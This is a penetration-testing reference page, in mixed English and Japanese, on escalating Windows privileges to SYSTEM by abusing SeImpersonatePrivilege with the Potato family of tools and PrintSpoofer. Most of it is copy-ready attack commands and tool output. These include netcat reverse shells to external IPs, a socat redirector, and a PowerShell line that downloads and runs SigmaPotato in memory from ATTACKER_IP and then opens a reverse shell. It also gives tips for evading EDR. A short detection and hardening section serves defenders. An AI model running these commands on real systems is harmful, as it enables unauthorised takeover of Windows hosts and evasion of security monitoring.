# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要件とよくある落とし穴

以下の手法はすべて、以下のいずれかの権限を持つコンテキストから、インパーソネーション（impersonation）が可能な特権サービスを悪用することに依存します:

- SeImpersonatePrivilege（最も一般的）または SeAssignPrimaryTokenPrivilege
- トークンがすでに SeImpersonatePrivilege を持っている場合（IIS AppPool、MSSQL など多くのサービスアカウントに典型的）、High integrity は不要です。

権限を素早く確認:
```cmd
whoami /priv | findstr /i impersonate
```
運用メモ:

- PrintSpoofer は Print Spooler service が稼働しており、ローカル RPC エンドポイント (spoolss) 経由で到達可能である必要があります。PrintNightmare 後に Spooler が無効化されているようなハードニングされた環境では、RoguePotato/GodPotato/DCOMPotato/EfsPotato を優先してください。
- RoguePotato は TCP/135 上で到達可能な OXID resolver を必要とします。egress がブロックされている場合は redirector/port-forwarder を使用してください（下の例を参照）。古いビルドでは -f フラグが必要でした。
- EfsPotato/SharpEfsPotato は MS-EFSR を悪用します。あるパイプがブロックされている場合は、代替のパイプ (lsarpc, efsrpc, samr, lsass, netlogon) を試してください。
- RpcBindingSetAuthInfo 実行中に発生する Error 0x6d3 は、通常、未知またはサポートされていない RPC 認証サービスを示します。別のパイプ/トランスポートを試すか、対象サービスが実行中であることを確認してください。

## クイックデモ

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意:
- 現在のコンソールでインタラクティブなプロセスを起動するには -i を、ワンライナーを実行するには -c を使用できます。
- Spooler service が必要です。無効になっていると失敗します。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
アウトバウンド135がブロックされている場合は、リダイレクタ上でsocat経由でOXID resolverをpivotしてください:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
ヒント: ある pipe が失敗するか EDR によってブロックされた場合は、他のサポートされている pipes を試してください:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notes:
- SeImpersonatePrivilege が存在する場合、Windows 8/8.1–11 および Server 2012–2022 で動作します。

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato は、デフォルトで RPC_C_IMP_LEVEL_IMPERSONATE を使用するサービスの DCOM オブジェクトを標的とする 2 種類のバリアントを提供します。提供された binaries をビルドするか使用して、コマンドを実行してください:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (更新された GodPotato フォーク)

SigmaPotato は .NET reflection を介した in-memory execution や PowerShell reverse shell helper といったモダンな便利機能を追加します。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## 検出とハードニングの注意点

- Monitor for processes creating named pipes and immediately calling token-duplication APIs followed by CreateProcessAsUser/CreateProcessWithTokenW. Sysmon can surface useful telemetry: Event ID 1 (process creation), 17/18 (named pipe created/connected), and command lines spawning child processes as SYSTEM.
- Spooler hardening: Disabling the Print Spooler service on servers where it isn’t needed prevents PrintSpoofer-style local coercions via spoolss.
- Service account hardening: カスタムサービスへの SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege の割当は最小限にする。可能であれば、必要最小権限の仮想アカウントでサービスを実行し、service SID や書き込み制限付きトークンで分離することを検討する。
- Network controls: outbound TCP/135 をブロックするか RPC endpoint mapper トラフィックを制限すると、内部リダイレクタがない限り RoguePotato を破綻させる可能性がある。
- EDR/AV: これらのツールは広くシグネチャ化されている。recompiling from source、シンボル/文字列のリネーム、または in-memory execution を用いることで検出を低減できるが、堅牢な振る舞いベースの検出を回避することはできない。

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
